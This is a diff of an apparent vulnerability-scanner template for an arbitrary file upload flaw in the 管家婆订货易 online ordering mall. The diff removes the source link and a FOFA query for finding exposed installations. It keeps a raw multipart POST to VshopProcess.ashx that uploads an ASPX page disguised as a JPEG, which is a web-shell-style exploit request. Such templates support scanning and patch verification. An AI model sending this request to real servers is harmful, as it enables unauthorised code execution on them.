@@ -3,12 +3,8 @@ info:
   name: 管家婆订货易在线商城 VshopProcess 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mta2a5333xsrb1lo'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mta2a5333xsrb1lo
-    fofa: title="订货易"||title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"
 http:
 - raw:
   - 'POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
 
 
-
-
     ------WebKitFormBoundarytCOFhbEjc3IfYaY5
 
 
@@ -35,8 +29,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <%@ Page Language="C#" %>
@@ -49,8 +41,6 @@ http:
 
 
     %>
-
-
 
 
     ------WebKitFormBoundarytCOFhbEjc3IfYaY5--
